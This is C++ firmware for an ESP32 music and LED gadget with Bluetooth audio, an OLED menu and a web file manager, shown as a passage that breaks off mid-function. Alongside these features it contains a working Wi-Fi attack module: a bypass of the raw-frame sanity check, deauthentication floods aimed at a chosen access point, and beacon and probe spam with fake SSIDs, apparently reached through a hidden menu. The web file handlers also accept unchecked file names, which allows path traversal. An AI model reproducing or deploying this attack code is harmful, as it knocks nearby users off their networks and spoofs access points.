// ============================================================
//  SOUMYA Gadget v9.4 — Clean Build
//  Music + BT + WiFi tools + Smooth UI
//  No animation player, no games, no IR hardware
//  BT and WiFi handled separately (DRAM safe)
// ============================================================

#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <SD.h>
#include <WiFi.h>
#include <WebServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <FastLED.h>
#include <AudioFileSourceSD.h>
#include <AudioGeneratorMP3.h>
#include <AudioOutput.h>
#include "esp32-hal-bt.h"

extern "C" {
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "esp_avrc_api.h"
#include "esp_wifi.h"
}

#include "led_music_ui.h"
#include "file_ui.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t,int32_t,int32_t){ return 0; }

// ───── Pins ─────
#define OLED_SDA 21
#define OLED_SCL 22
#define OLED_ADDR 0x3C
#define SCR_W 128
#define SCR_H 64
#define PIN_SD_CS   5
#define PIN_SD_SCK  18
#define PIN_SD_MISO 19
#define PIN_SD_MOSI 23
#define PIN_LED_DATA 13
#define LED_MAX 60
#define PIN_STATUS_LED 12
#define STATUS_LED_COUNT 2

#define AP_SSID "ESP32-Gadget"
#define AP_PASS "88888888"
#define AP_CHANNEL 6
#define BT_NAME "SOUMYA-Music"
#define MUSIC_DIR "/music"
#define RING_SIZE 4096
#define MAX_SONGS 32

// ───── Enums ─────
enum Mode : uint8_t {
    M_BOOT, M_MAIN, M_SONGS, M_PLAYER,
    M_BT_MENU, M_BT_SCAN,
    M_LED_MENU,
    M_WIFI_FILES,
    M_HIDDEN, M_WIFI_APLIST, M_WIFI_ATK, M_ATTACK_RUN,
    M_IR_MENU, M_IR_LEARN, M_IR_TX, M_IR_JAM,
    M_INFO
};

enum AttackMode : uint8_t { ATK_NONE, ATK_BEACON, ATK_DEAUTH, ATK_PROBE };

struct APRecord { char ssid[33]; char bssid[18]; int rssi; int channel; };

struct State {
    Mode mode = M_BOOT;
    int mainSel = 0, subSel = 0;
    int ledBright = 150, ledCount = 60, curEffect = 1;
    int songCount = 0, currentSong = -1;
    bool isPlaying = false;
    int batteryPct = 78;
} g;

Adafruit_SSD1306 display(SCR_W, SCR_H, &Wire, -1);
CRGB mainLeds[LED_MAX];
CRGB flashLeds[STATUS_LED_COUNT];
WebServer ledServer(80);
static bool webRunning = false;

String songFiles[MAX_SONGS];
int songCount = 0;
static bool a2dpStarted = false;

// Audio ring buffer
static int16_t ringBuf[RING_SIZE];
static volatile int rbHead = 0, rbTail = 0;
static portMUX_TYPE rbMux = portMUX_INITIALIZER_UNLOCKED;
static volatile float gRMS = 0.0f;

static volatile bool a2dpConnected = false;
static volatile bool a2dpStreaming = false;

// BT devices
struct BtDev { char name[32]; char mac[18]; int rssi; };
static BtDev btDevs[16];
static volatile int btDevCount = 0;
static volatile bool btScanning = false;
static int btSel = 0;
static int btConnectTarget = -1;
static unsigned long btConnectStart = 0;

// WiFi APs
static APRecord aps[20];
static int apCount = 0;
static volatile bool scanInProgress = false;
static volatile bool scanReady = false;
static int selectedAP = 0;

// Attack state
static volatile bool atkRun = false;
static AttackMode atkMode = ATK_NONE;
static TaskHandle_t atkTask = nullptr;
static char atkBSSID[18];
static int atkChannel = 1;
static volatile int atkPkts = 0;

static unsigned long lastActivity = 0;
static int animFrame = 0;
static volatile int gSerialEv = -1;

// Smooth UI
#define SMOOTH_RATE 16.0f
float smSel = 0, smScroll = 0;
uint8_t smScene = 255;
unsigned long smLastMs = 0;

float lerpf(float a, float b, float t){ return a + (b-a)*t; }
void smTick(uint8_t scene, float ts, float tsc){
    unsigned long now = millis();
    if (smScene != scene) { smSel = ts; smScroll = tsc; }
    else {
        float dt = (now - smLastMs) / 1000.0f;
        if (dt > 0.08f) dt = 0.08f;
        float k = 1.0f - expf(-SMOOTH_RATE * dt);
        smSel = lerpf(smSel, ts, k);
        smScroll = lerpf(smScroll, tsc, k);
    }
    smScene = scene; smLastMs = now;
}

// ───── Ring buffer ─────
static void rb_push(int16_t L, int16_t R){
    portENTER_CRITICAL(&rbMux);
    int next = (rbHead + 2) % RING_SIZE;
    if (next != rbTail) {
        ringBuf[rbHead] = L;
        ringBuf[(rbHead+1) % RING_SIZE] = R;
        rbHead = next;
    }
    portEXIT_CRITICAL(&rbMux);
}

class AudioOutRB : public AudioOutput {
public:
    bool ConsumeSample(int16_t s[2]) override { rb_push(s[0], s[1]); return true; }
    bool begin() override { return true; }
    bool stop() override { return true; }
};

static int32_t a2d_data_cb(uint8_t* buf, int32_t len){
    int16_t* out = (int16_t*)buf;
    int frames = len / 4;
    int n = 0;
    portENTER_CRITICAL(&rbMux);
    int pairs = ((rbHead - rbTail + RING_SIZE) % RING_SIZE) / 2;
    n = (frames < pairs) ? frames : pairs;
    for (int i = 0; i < n; i++) {
        out[i*2]   = ringBuf[rbTail]; rbTail = (rbTail + 1) % RING_SIZE;
        out[i*2+1] = ringBuf[rbTail]; rbTail = (rbTail + 1) % RING_SIZE;
    }
    portEXIT_CRITICAL(&rbMux);
    if (n < frames) memset(&out[n*2], 0, (frames - n) * 4);

    int64_t sum = 0;
    for (int i = 0; i < n; i++) { int32_t s = out[i*2]; sum += (int64_t)s * s; }
    if (n > 0) gRMS = sqrtf((float)sum / n) / 32768.0f;
    return len;
}

static void a2d_conn_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t* param) {
    if (event == ESP_A2D_CONNECTION_STATE_EVT) {
        uint8_t st = param->conn_stat.state;
        if (st == ESP_A2D_CONNECTION_STATE_CONNECTED) {
            a2dpConnected = true;
            Serial.println("[A2DP] CONNECTED");
            esp_a2d_media_ctrl(ESP_A2D_MEDIA_CTRL_START);
        } else if (st == ESP_A2D_CONNECTION_STATE_DISCONNECTED) {
            a2dpConnected = false;
            a2dpStreaming = false;
            Serial.println("[A2DP] DISCONNECTED");
        }
    } else if (event == ESP_A2D_AUDIO_STATE_EVT) {
        uint8_t st = param->audio_stat.state;
        if (st == ESP_A2D_AUDIO_STATE_STARTED) {
            a2dpStreaming = true;
            Serial.println("[A2DP] STREAM STARTED");
        } else {
            a2dpStreaming = false;
        }
    }
}

static void bt_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    if (event == ESP_BT_GAP_DISC_RES_EVT) {
        char bda[18];
        sprintf(bda, "%02X:%02X:%02X:%02X:%02X:%02X",
            param->disc_res.bda[0], param->disc_res.bda[1],
            param->disc_res.bda[2], param->disc_res.bda[3],
            param->disc_res.bda[4], param->disc_res.bda[5]);
        char nm[32] = {0};
        int rssi = -70;
        for (int i = 0; i < param->disc_res.num_prop; i++) {
            if (param->disc_res.prop[i].type == ESP_BT_GAP_DEV_PROP_BDNAME) {
                int len = param->disc_res.prop[i].len;
                if (len > 31) len = 31;
                memcpy(nm, param->disc_res.prop[i].val, len);
                nm[len] = 0;
            } else if (param->disc_res.prop[i].type == ESP_BT_GAP_DEV_PROP_RSSI) {
                rssi = *(int8_t*)param->disc_res.prop[i].val;
            }
        }
        if (nm[0] == 0) strcpy(nm, "(unnamed)");
        for (int i = 0; i < btDevCount; i++)
            if (strcmp(btDevs[i].mac, bda) == 0) return;
        if (btDevCount < 16) {
            strncpy(btDevs[btDevCount].name, nm, 31);
            strncpy(btDevs[btDevCount].mac, bda, 17);
            btDevs[btDevCount].rssi = rssi;
            btDevCount++;
            Serial.printf("[BT] %s [%s] %d dBm\n", nm, bda, rssi);
        }
    } else if (event == ESP_BT_GAP_DISC_STATE_CHANGED_EVT) {
        if (param->disc_st.chg.state == ESP_BT_GAP_DISCOVERY_STOPPED) {
            btScanning = false;
            Serial.println("[BT] Scan complete");
        }
    }
}

static AudioFileSource*  audioSrc = nullptr;
static AudioGeneratorMP3* audioMP3 = nullptr;
static AudioOutRB*       audioRB  = nullptr;

// ───── Audio ─────
void loadSongs(){
    songCount = 0;
    File dir = SD.open(MUSIC_DIR, FILE_READ);
    if (!dir || !dir.isDirectory()) return;
    File f = dir.openNextFile();
    while (f && songCount < MAX_SONGS) {
        String n = String(f.name());
        if (!f.isDirectory()) {
            String l = n; l.toLowerCase();
            if (l.endsWith(".mp3")) songFiles[songCount++] = String(MUSIC_DIR) + "/" + n;
        }
        f = dir.openNextFile();
    }
    dir.close();
    g.songCount = songCount;
}

String songName(int idx){
    if (idx < 0 || idx >= songCount) return "(none)";
    String p = songFiles[idx];
    int s = p.lastIndexOf('/');
    return s >= 0 ? p.substring(s+1) : p;
}

void ensureBT(){
    if (a2dpStarted) return;
    Serial.println("[BT] Init stack...");
    esp_bt_controller_mem_release(ESP_BT_MODE_BLE);
    if (!btStart()) { Serial.println("[BT] btStart failed"); return; }
    delay(150);
    if (esp_bluedroid_get_status() == ESP_BLUEDROID_STATUS_UNINITIALIZED)
        esp_bluedroid_init();
    if (esp_bluedroid_get_status() != ESP_BLUEDROID_STATUS_ENABLED)
        esp_bluedroid_enable();
    esp_bt_dev_set_device_name(BT_NAME);
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
    esp_bt_gap_register_callback(bt_gap_cb);
    esp_a2d_source_init();
    esp_a2d_register_callback(a2d_conn_cb);
    esp_a2d_source_register_data_callback(a2d_data_cb);
    delay(150);
    a2dpStarted = true;
    Serial.println("[BT] Stack ready");
}

void shutdownBTForWiFi(){
    if (!a2dpStarted) return;
    Serial.println("[BT] Freeing for WiFi...");
    if (audioMP3 && audioMP3->isRunning()) audioMP3->stop();
    if (audioSrc) audioSrc->close();
    delete audioMP3; audioMP3 = nullptr;
    delete audioSrc; audioSrc = nullptr;
    g.isPlaying = false;
    rbHead = rbTail = 0;
    delay(100);
    esp_a2d_source_deinit();
    esp_bluedroid_disable();
    esp_bluedroid_deinit();
    esp_bt_controller_disable();
    esp_bt_controller_deinit();
    a2dpStarted = false;
    a2dpConnected = false;
    a2dpStreaming = false;
    delay(200);
    Serial.println("[BT] Freed");
}

void stopSong(){
    if (audioMP3 && audioMP3->isRunning()) audioMP3->stop();
    if (audioSrc) audioSrc->close();
    delete audioMP3; audioMP3 = nullptr;
    delete audioSrc;  audioSrc  = nullptr;
    g.isPlaying = false;
    rbHead = rbTail = 0;
}

void playSong(int idx){
    if (idx < 0 || idx >= songCount) return;
    stopSong(); delay(50);
    g.currentSong = idx;
    ensureBT();
    audioSrc = new AudioFileSourceSD(songFiles[idx].c_str());
    if (!audioSrc) return;
    audioMP3 = new AudioGeneratorMP3();
    if (!audioMP3) { delete audioSrc; audioSrc = nullptr; return; }
    if (audioMP3->begin(audioSrc, audioRB)) g.isPlaying = true;
    else stopSong();
}

void nextSong(){ if (songCount) playSong((g.currentSong + 1) % songCount); }
void prevSong(){ if (songCount) playSong((g.currentSong - 1 + songCount) % songCount); }

// ───── BT discovery ─────
static void startBtDiscovery(){
    if (btScanning) return;
    if (!a2dpStarted) ensureBT();
    btDevCount = 0;
    btSel = 0;
    esp_bt_gap_register_callback(bt_gap_cb);
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 20, 0);
    btScanning = true;
    Serial.println("[BT] Discovery started");
}

static void stopBtDiscovery(){
    if (!btScanning) return;
    esp_bt_gap_cancel_discovery();
    btScanning = false;
}

static void btConnect(int idx){
    if (idx < 0 || idx >= btDevCount) return;
    if (!a2dpStarted) ensureBT();
    btConnectTarget = idx;
    btConnectStart = millis();
    a2dpConnected = false;
    a2dpStreaming = false;
    uint8_t bda[6];
    unsigned int v[6];
    sscanf(btDevs[idx].mac, "%x:%x:%x:%x:%x:%x",
           &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]);
    for (int i = 0; i < 6; i++) bda[i] = (uint8_t)v[i];
    Serial.printf("[BT] Connecting to %s\n", btDevs[idx].name);
    esp_a2d_source_connect(bda);
}

// ───── LED ─────
static int ledHue = 0;
static void updateLED(){
    static unsigned long last = 0;
    if (millis() - last < 30) return;
    last = millis();
    int n = g.ledCount;
    uint8_t bri = g.ledBright;
    uint8_t hue = ledHue;
    if (g.curEffect < 16) {
        switch (g.curEffect) {
            case 0: for (int i = 0; i < n; i++) mainLeds[i] = CHSV(hue, 255, bri); break;
            case 1: for (int i = 0; i < n; i++) mainLeds[i] = CHSV(hue + i * 256 / n, 255, bri); ledHue = (ledHue + 3) & 0xFF; break;
            case 2: { float b = (sinf(millis() / 1000.0f) + 1.0f) * 0.5f; for (int i = 0; i < n; i++) mainLeds[i] = CHSV(hue, 255, b * bri); break; }
            case 3: { fadeToBlackBy(mainLeds, n, 48); int p = (millis() / 40) % n; mainLeds[p] = CHSV(hue, 255, bri); break; }
            default: for (int i = 0; i < n; i++) mainLeds[i] = CHSV(hue, 255, bri); break;
        }
    } else {
        float r = gRMS;
        if (r > 1.0f) r = 1.0f;
        uint8_t b = (uint8_t)constrain(20 + r * 235, 20, bri);
        uint8_t mh = hue + (uint8_t)(r * 128);
        int bars = (int)(r * n);
        for (int i = 0; i < n; i++)
            mainLeds[i] = (i < bars) ? CHSV(mh, 255, b) : CRGB(0,0,0);
    }
    FastLED.show();
}

// ───── Attacks ─────
static uint8_t deauthFrame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x07,0x00};

static bool parseMac(const char* s, uint8_t* o){
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) o[i] = (uint8_t)v[i];
    return true;
}

static int buildBeacon(uint8_t* b, int bLen, const char* ssid, int ch){
    int sl = strlen(ssid);
    if (sl > 32 || bLen < (38 + sl)) return 0;
    memset(b, 0, bLen);
    int i = 0;
    b[i++]=0x80; b[i++]=0x00; b[i++]=0x00; b[i++]=0x00;
    memset(b+i, 0xFF, 6); i += 6;
    uint8_t mac[6];
    for (int k = 0; k < 6; k++) mac[k] = random(0, 256);
    mac[0] = (mac[0] | 0x02) & 0xFE;
    memcpy(b+i, mac, 6); i += 6;
    memcpy(b+i, mac, 6); i += 6;
    i += 2; memset(b+i, 0, 8); i += 8;
    b[i++]=0x64; b[i++]=0x00; b[i++]=0x31; b[i++]=0x04;
    b[i++]=0x00; b[i++]=(uint8_t)sl;
    memcpy(b+i, ssid, sl); i += sl;
    b[i++]=0x01; b[i++]=0x08;
    const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
    memcpy(b+i, r, 8); i += 8;
    b[i++]=0x03; b[i++]=0x01; b[i++]=(uint8_t)ch;
    return i;
}

static const char* FAKE[] = {
    "JioFiber_5G","Airtel_Xstream","TP-Link_2.4G","Netgear_Home",
    "Sharma_Home","Rahul_iPhone","Home_Sweet_Home","AndroidAP_1234",
    "iPhone_Hotspot","Redmi_Note12","Samsung_A54","Cafe_Coffee_Day"
};
#define FAKE_N (sizeof(FAKE)/sizeof(FAKE[0]))

static void attackWorker(void*){
    uint8_t bssid[6];
    parseMac(atkBSSID, bssid);
    atkPkts = 0;
    if (atkMode == ATK_BEACON) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t f[256];
        while (atkRun) {
            for (int ch = 1; ch <= 13 && atkRun; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                const char* s = FAKE[random(0, FAKE_N)];
                int l = buildBeacon(f, sizeof(f), s, ch);
                if (l > 0 && esp_wifi_80211_tx(WIFI_IF_STA, f, l, false) == ESP_OK) atkPkts++;
                vTaskDelay(1);
            }
        }
    } else if (atkMode == ATK_DEAUTH) {
        WiFi.mode(WIFI_STA); delay(100);
        esp_wifi_set_channel(atkChannel, WIFI_SECOND_CHAN_NONE);
        uint8_t f[26];
        while (atkRun) {
            memcpy(f, deauthFrame, 26);
            memcpy(f+10, bssid, 6); memcpy(f+16, bssid, 6);
            for (int i = 0; i < 50 && atkRun; i++) {
                f[22] = i & 0xFF; f[23] = (i>>8) & 0xFF;
                if (esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false) == ESP_OK) atkPkts++;
            }
            vTaskDelay(30);
        }
    } else if (atkMode == ATK_PROBE) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t f[128];
        while (atkRun) {
            for (int ch = 1; ch <= 13 && atkRun; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                memset(f, 0, sizeof(f));
                int i = 0;
                f[i++]=0x40; f[i++]=0x00; f[i++]=0x00; f[i++]=0x00;
                memset(f+i, 0xFF, 6); i += 6;
                uint8_t m[6];
                for (int k = 0; k < 6; k++) m[k] = random(0, 256);
                m[0] = (m[0]|0x02)&0xFE;
                memcpy(f+i, m, 6); i += 6;
                memcpy(f+i, m, 6); i += 6;
                i += 2;
                const char* s = FAKE[random(0, FAKE_N)];
                int sl = strlen(s);
                f[i++]=0x00; f[i++]=(uint8_t)sl;
                memcpy(f+i, s, sl); i += sl;
                f[i++]=0x01; f[i++]=0x08;
                const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
                memcpy(f+i, r, 8); i += 8;
                if (esp_wifi_80211_tx(WIFI_IF_STA, f, i, false) == ESP_OK) atkPkts++;
                vTaskDelay(1);
            }
        }
    }
    atkRun = false;
    atkMode = ATK_NONE;
    vTaskDelete(nullptr);
}

static void startBeacon(){
    if (atkRun) return;
    atkMode = ATK_BEACON; atkRun = true;
    xTaskCreatePinnedToCore(attackWorker, "atk", 4096, nullptr, 1, &atkTask, 1);
}
static void startProbe(){
    if (atkRun) return;
    atkMode = ATK_PROBE; atkRun = true;
    xTaskCreatePinnedToCore(attackWorker, "atk", 4096, nullptr, 1, &atkTask, 1);
}
static void startDeauth(int idx){
    if (atkRun || idx < 0 || idx >= apCount) return;
    strncpy(atkBSSID, aps[idx].bssid, 17); atkBSSID[17]=0;
    atkChannel = aps[idx].channel;
    atkMode = ATK_DEAUTH; atkRun = true;
    xTaskCreatePinnedToCore(attackWorker, "atk", 8192, nullptr, 1, &atkTask, 1);
}
static void stopAttack(){
    if (!atkRun) return;
    atkRun = false;
    delay(250);
    WiFi.mode(WIFI_OFF);
}

// ───── WiFi scan ─────
static void startAsyncScan(){
    if (scanInProgress) return;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
    WiFi.scanNetworks(true, true);
    scanInProgress = true;
    scanReady = false;
    apCount = 0;
    Serial.println("[WiFi] Scanning...");
}

static void pollScan(){
    if (!scanInProgress) return;
    int n = WiFi.scanComplete();
    if (n == WIFI_SCAN_RUNNING) return;
    if (n < 0) { scanInProgress = false; return; }
    apCount = min(n, 20);
    for (int i = 0; i < apCount; i++) {
        strncpy(aps[i].ssid, WiFi.SSID(i).c_str(), 32); aps[i].ssid[32]=0;
        strncpy(aps[i].bssid, WiFi.BSSIDstr(i).c_str(), 17); aps[i].bssid[17]=0;
        aps[i].rssi = WiFi.RSSI(i);
        aps[i].channel = WiFi.channel(i);
    }
    WiFi.scanDelete();
    scanInProgress = false;
    scanReady = true;
    Serial.printf("[WiFi] Found %d networks\n", apCount);
}

// ───── Web handlers ─────
static void hLedRoot(){ ledServer.send_P(200, "text/html", LED_MUSIC_HTML); }
static void hFileRoot(){ ledServer.send_P(200, "text/html", FILE_MANAGER_HTML); }

static void hFileList(){
    uint32_t totalMB = SD.totalBytes() >> 20;
    uint32_t freeMB  = (SD.totalBytes() - SD.usedBytes()) >> 20;
    String j = "{\"files\":[";
    File dir = SD.open(MUSIC_DIR, FILE_READ);
    bool first = true;
    if (dir) {
        File f = dir.openNextFile();
        while (f) {
            if (!f.isDirectory()) {
                if (!first) j += ',';
                j += "{\"name\":\""; j += String(f.name());
                j += "\",\"size\":"; j += (uint32_t)f.size(); j += "}";
                first = false;
            }
            f = dir.openNextFile();
        }
        dir.close();
    }
    j += "],\"totalMB\":"; j += totalMB;
    j += ",\"freeMB\":"; j += freeMB;
    j += "}";
    ledServer.send(200, "application/json", j);
}

static File _upF;
static void hFileUpload(){
    HTTPUpload& u = ledServer.upload();
    if (u.status == UPLOAD_FILE_START) {
        String p = String(MUSIC_DIR) + "/" + u.filename;
        _upF = SD.open(p.c_str(), FILE_WRITE);
    } else if (u.status == UPLOAD_FILE_WRITE) {
        if (_upF) _upF.write(u.buf, u.currentSize);
    } else if (u.status == UPLOAD_FILE_END) {
        if (_upF) _upF.close();
        loadSongs();
    }
}
static void hFileDelete(){
    String n = ledServer.arg("name");
    if (n.length() == 0) { ledServer.send(400, "text/plain", "no name"); return; }
    String p = String(MUSIC_DIR) + "/" + n;
    if (SD.remove(p.c_str())) { loadSongs(); ledServer.send(200, "text/plain", "OK"); }
    else ledServer.send(500, "text/plain", "fail");
}
static void hFileDownload(){
    String n = ledServer.arg("name");
    String p = String(MUSIC_DIR) + "/" + n;
    File f = SD.open(p.c_str(), FILE_READ);
    if (!f) { ledServer.send(404, "text/plain", "not found"); return; }
    ledServer.sendHeader("Content-Disposition", "attachment; filename=" + n);
    ledServer.streamFile(f, "audio/mpeg");
    f.close();
}
static void hMusicList(){
    String j = "{\"songs\":[";
    for (int i = 0; i < songCount; i++) {
        if (i) j += ',';
        j += "{\"idx\":"; j += i; j += ",\"name\":\""; j += songName(i); j += "\"}";
    }
    j += "],\"current\":"; j += g.currentSong;
    j += ",\"playing\":"; j += (g.isPlaying ? "true" : "false");
    j += ",\"effect\":"; j += g.curEffect;
    j += ",\"bright\":"; j += g.ledBright;
    j += ",\"count\":"; j += g.ledCount;
    j += "}";
    ledServer.send(200, "application/json", j);
}
static void hLedCmd(){
    if (ledServer.hasArg("effect"))     g.curEffect = ledServer.arg("effect").toInt();
    if (ledServer.hasArg("brightness")) g.ledBright = constrain(ledServer.arg("brightness").toInt(),0,255);
    if (ledServer.hasArg("count"))      g.ledCount = constrain(ledServer.arg("count").toInt(),1,LED_MAX);
    if (ledServer.hasArg("hue"))        ledHue = ledServer.arg("hue").toInt() & 0xFF;
    ledServer.send(200, "text/plain", "OK");
}
static void hMusicCmd(){
    String a = ledServer.arg("action");
    if      (a == "play") { int i = ledServer.arg("idx").toInt(); if (i>=0 && i<songCount) playSong(i); }
    else if (a == "next") nextSong();
    else if (a == "prev") prevSong();
    else if (a == "stop") stopSong();
    ledServer.send(200, "text/plain", "OK");
}

static void startWeb(){
    shutdownBTForWiFi();
    if (webRunning) return;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL);
    ledServer.on("/",                hLedRoot);
    ledServer.on("/led",             hLedCmd);
    ledServer.on("/music",           hMusicCmd);
    ledServer.on("/music/list",      hMusicList);
    ledServer.on("/files",           hFileRoot);
    ledServer.on("/files/list",      hFileList);
    ledServer.on("/files/delete",    HTTP_POST, hFileDelete);
    ledServer.on("/files/download",  hFileDownload);
    ledServer.on("/files/upload",    HTTP_POST, [](){ ledServer.send(200,"text/plain","OK"); }, hFileUpload);
    ledServer.begin();
    webRunning = true;
    Serial.println("[WiFi] AP started");
}
static void stopWeb(){
    if (!webRunning) return;
    ledServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    webRunning = false;
}

// ───── Display helpers ─────
static void wakeDisplay(){ lastActivity = millis(); }

static void drawBattery(int x, int y, bool dark){
    uint16_t c = dark ? BLACK : WHITE;
    display.drawRect(x, y, 16, 9, c);
    display.fillRect(x+16, y+3, 2, 3, c);
    int f = (g.batteryPct * 12) / 100;
    if (f > 0) display.fillRect(x+2, y+2, f, 5, c);
}

static void hdr(const char* t){
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK);
    display.setTextSize(1);
    display.setCursor(4, 3);
    display.print(t);
    drawBattery(SCR_W-22, 2, true);
    display.setTextColor(WHITE);
}
static void hdrL(const char* t){
    display.drawFastHLine(0, 0, SCR_W, WHITE);
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(4, 5);
    display.print(t);
    drawBattery(SCR_W-22, 4, false);
}

static void iPlay(int x,int y,uint16_t c){display.fillTriangle(x+2,y+1,x+2,y+7,x+7,y+4,c);}
static void iMusic(int x,int y,uint16_t c){display.fillCircle(x+2,y+5,2,c);display.drawFastVLine(x+3,y+1,5,c);display.drawPixel(x+4,y+1,c);display.drawPixel(x+5,y+1,c);display.drawPixel(x+6,y+2,c);}
static void iBT(int x,int y,uint16_t c){display.drawFastVLine(x+4,y,8,c);display.drawLine(x+4,y,x+6,y+2,c);display.drawLine(x+6,y+2,x+2,y+4,c);display.drawLine(x+4,y+7,x+6,y+5,c);display.drawLine(x+6,y+5,x+2,y+3,c);}
static void iLED(int x,int y,uint16_t c){display.drawCircle(x+4,y+3,3,c);display.fillRect(x+3,y+6,3,2,c);}
static void iWifi(int x,int y,uint16_t c){display.drawPixel(x+2,y,c);display.drawPixel(x+3,y,c);display.drawPixel(x+4,y,c);display.drawPixel(x+5,y,c);display.drawPixel(x+1,y+1,c);display.drawPixel(x+6,y+1,c);display.drawPixel(x,y+2,c);display.drawPixel(x+7,y+2,c);display.drawPixel(x+2,y+3,c);display.drawPixel(x+3,y+3,c);display.drawPixel(x+4,y+3,c);display.drawPixel(x+5,y+3,c);display.drawPixel(x+1,y+4,c);display.drawPixel(x+6,y+4,c);display.drawPixel(x+3,y+5,c);display.drawPixel(x+4,y+5,c);display.fillRect(x+3,y+6,2,2,c);}

static void iPlayL(int x,int y,uint16_t c){display.fillTriangle(x+4,y+2,x+4,y+14,x+14,y+8,c);}
static void iMusicL(int x,int y,uint16_t c){display.fillCircle(x+4,y+11,3,c);display.fillCircle(x+11,y+9,3,c);display.drawFastVLine(x+6,y+3,8,c);display.drawFastVLine(x+13,y+1,8,c);display.drawFastHLine(x+6,y+1,8,c);}
static void iBTL(int x,int y,uint16_t c){display.drawFastVLine(x+8,y,16,c);display.drawLine(x+8,y,x+14,y+4,c);display.drawLine(x+14,y+4,x+2,y+11,c);display.drawLine(x+8,y+15,x+14,y+11,c);display.drawLine(x+14,y+11,x+2,y+4,c);}
static void iLEDL(int x,int y,uint16_t c){display.drawCircle(x+8,y+6,5,c);display.fillRect(x+6,y+12,5,4,c);}

// ───── Screens ─────
static void sBoot(){
    static int step = 0; static unsigned long lastMs = 0; static int w = 0;
    const char* n = "SOUMYA"; unsigned long now = millis();
    if (step == 0) { display.clearDisplay(); display.display(); lastMs = now; step = 1; return; }
    if (step >= 1 && step <= 6) {
        if (now - lastMs > 200) {
            display.clearDisplay(); display.setTextSize(2); display.setTextColor(WHITE);
            for (int i = 0; i < step; i++) { display.setCursor(22+i*15, 20); display.print(n[i]); }
            if (step < 6) display.fillRect(22 + step*15, 20, 2, 16, WHITE);
            display.display(); lastMs = now; step++;
        }
    } else if (step == 7) {
        if (now - lastMs > 400) { display.fillRect(22+6*15, 20, 2, 16, BLACK); display.display(); lastMs = now; step++; }
    } else if (step >= 8 && step <= 36) {
        if (now - lastMs > 30) {
            display.clearDisplay(); display.setTextSize(2); display.setTextColor(WHITE);
            for (int i = 0; i < 6; i++) { display.setCursor(22+i*15, 20); display.print(n[i]); }
            display.drawFastHLine(22, 42, w, WHITE);
            display.display(); w += 3; lastMs = now; step++;
        }
    } else if (step == 37) {
        if (now - lastMs > 400) { g.mode = M_MAIN; g.mainSel = 0; step = 0; w = 0; }
    }
}

const char* MAIN_IT[] = {"Play","Songs","Bluetooth","LED Effects","Info","WiFi Files"};
static void sMain(){
    const int count = 6;
    smTick(M_MAIN, g.mainSel, g.mainSel);
    display.clearDisplay(); hdr("HOME");
    int cx = SCR_W/2, cy = 36, spacing = 50;
    for (int idx = 0; idx < count; idx++) {
        float dx = (idx - smSel) * spacing;
        int x = cx + (int)dx;
        if (x > -30 && x < SCR_W + 30) {
            float dist = fabsf((float)idx - smSel);
            bool isCenter = dist < 0.7f;
            if (isCenter) {
                display.fillRoundRect(x-20, cy-18, 40, 34, 8, WHITE);
                uint16_t c = BLACK;
                int bx = x-8, by = cy-10;
                switch (idx) {
                    case 0: iPlayL(bx,by,c); break;
                    case 1: iMusicL(bx,by,c); break;
                    case 2: iBTL(bx,by,c); break;
                    case 3: iLEDL(bx,by,c); break;
                    case 4: display.drawCircle(x, cy, 7, BLACK); display.drawFastVLine(x, cy-5, 11, BLACK); break;
                    case 5: iWifi(bx+4, by+2, BLACK); break;
                }
                display.setTextColor(WHITE);
                int tw = strlen(MAIN_IT[idx]) * 6;
                display.setCursor(cx - tw/2, 54); display.print(MAIN_IT[idx]);
            } else {
                display.drawRoundRect(x-12, cy-10, 24, 20, 5, WHITE);
                uint16_t c = WHITE;
                int ix = x-4, iy = cy-8;
                switch (idx) {
                    case 0: iPlay(ix,iy,c); break;
                    case 1: iMusic(ix,iy,c); break;
                    case 2: iBT(ix,iy,c); break;
                    case 3: iLED(ix,iy,c); break;
                    case 4: display.drawCircle(x, cy, 4, WHITE); break;
                    case 5: iWifi(ix,iy,c); break;
                }
            }
        }
    }
    display.display();
}

static void sSongs(){
    const int visRows = 3, rowH = 16, baseY = 20;
    int targetOffset = 0;
    if (g.subSel >= 2) targetOffset = g.subSel - 1;
    if (targetOffset + visRows > songCount) targetOffset = songCount - visRows;
    if (targetOffset < 0) targetOffset = 0;
    smTick(M_SONGS, g.subSel, targetOffset);
    display.clearDisplay();
    int idxLo = (int)floorf(smScroll) - 1;
    int idxHi = (int)floorf(smScroll) + visRows + 1;
    for (int si = idxLo; si <= idxHi; si++) {
